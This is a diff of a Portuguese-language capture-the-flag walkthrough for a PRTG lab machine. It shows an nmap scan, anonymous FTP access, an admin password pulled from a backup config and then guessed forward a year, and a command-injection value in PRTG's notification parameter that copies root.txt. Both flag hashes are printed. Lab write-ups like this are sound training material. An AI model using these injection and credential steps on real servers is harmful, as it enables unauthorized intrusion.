@@ -1,6 +1,4 @@
-## Walkthrough
-
-#### Terminal
+1. Usar nmap para escanear portas e encontrar possíveis fragilidades
 
 ```
 $ nmap 10.10.10.152
@@ -19,6 +17,7 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 11.33 seconds
 ```
 
+2. A porta 21, do protocolo FTP (para transferência de arquivos), está aberta. Isso significa que podemos conectar como anônimos e começar uma busca pelos diretórios
 ```
 $ lftp Anonymous@10.10.10.152
 
@@ -47,13 +46,17 @@ $lftp> ls
 04-11-19  11:28AM                           90 tester.txt
 **02-03-19  12:35AM                           33 user.txt**
 07-16-16  09:18AM       <DIR>          Videos
+```
 
+3. Apenas andando pelos diretórios conseguimos encontrar a **primeira flag**, no arquivo _user.txt_, que nos concede acesso de usuário
+
+```
 $lftp> cat user.txt
 **dd58ce67b49e15105e88096c8d9255a5**        
 33 bytes transferred
 ```
 
-**user.txt -> dd58ce67b49e15105e88096c8d9255a5**
+4. Continuando a busca, encontramos arquivos de backup (.old e .bak)
 
 ```
 $lftp> ls -a
@@ -92,7 +95,11 @@ $lftp> ls -a
 02-03-19  12:18AM       <DIR>          System Information Database
 02-03-19  12:40AM       <DIR>          Ticket Database
 02-03-19  12:18AM       <DIR>          ToDo Database
+```
 
+5. A análise desses arquivos revela um usuário e uma senha de admin 
+
+```
 $lftp> cat PRTG\ Configuration.old.bak
 ...
 <dbpassword>
@@ -102,23 +109,35 @@ PrTg@dmin2018
 ...
 ```
 
-#### Site http://10.10.10.152
+6. A porta http (80) aberta mostrada no escaneamento do IP, dá indicios de que teremos um site para analisar. No site, tentamos as credenciais:
+
+**Username: prtgadmin   
+Password: PrTg@dmin2018**
+
+E ganhamos acesso negado. Mas vale lembrar que aquilo era um arquivo de backup, então talvez a seja atual tenha mais a ver com o ano atual:
 
 Username: prtgadmin
 Password: PrTg@dmin2019
 
+7. Com o login de administrador aceito, vamos tentar executar um programa no servidor a partir da central de notificações do site:
+
 Setup -> Notifications -> Edit Notifications -> Execute Program 
 
 Run command in powershell:
-1. Demo exe notification - outfile.ps1
-2. Parameter:
+* Demo exe notification - outfile.ps1
+
+No parâmetro, colocaremos um código para copiar o arquivo _root.txt_ do diretório _Administrator_ que não possuimos acesso quando entramos como anônimos no FTP para um diretório no qual possuímos acesso:
+
+* Parameter:
 ```
 flag.txt; Copy-item "C:\Users\Administrator\Desktop\root.txt" -Destination "C:\Users\Public\flag.txt" -Recurse
 ```
-3. Execute Notification
+* Execute Notification
 
-4. In ```$lftp> Users/Public```
+8. Voltando ao terminal e nos conectando a partir do FTP, podemos ir até o diretório para onde mandamos o arquivo copiado:
 ```
-$ cat flag.txt
+$lftp> Users/Public
+$lftp> cat flag.txt
+**3018977fb944bf1878f75b879fba67cc**
 ```
-**root.txt -> 3018977fb944bf1878f75b879fba67cc**
+E teremos acesso também a **segunda flag**, do arquivo _root.txt_
